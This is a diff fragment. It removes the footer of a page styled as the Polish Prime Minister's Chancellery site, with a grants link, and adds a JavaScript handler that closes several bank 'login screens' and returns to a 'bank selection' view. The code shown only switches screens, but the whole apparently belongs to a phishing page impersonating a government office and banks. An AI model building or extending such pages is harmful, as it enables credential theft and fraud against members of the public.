-                        <li><a href="#">Dotacje</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Kontakt</h4>
-                    <ul>
-                        <li><a href="#">Infolinia</a></li>
-                        <li><a href="#">ePUAP</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <div class="container">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div>
-            </div>
-        </footer>
-
-    </div>
-
-    <script src="script.js"></script>
-</body>
-</html>
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        const screens = ['loginScreen1','loginScreen2','loginScreen3','loginScreen4','loginScreen5','loginScreen6','loginScreen7','loginScreen8','loginScreen9','loginScreen10','loginScreen12'];
+        screens.forEach(id => {
+            const el = document.getElementById(id);
+            if (el && el.classList.contains('visible')) {
+                el.classList.remove('visible');
+                document.getElementById('bankSelection').classList.add('visible');
+                document.getElementById('bankFooter').classList.add('visible');
+                document.body.style.overflow = '';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        });
+    }
+});
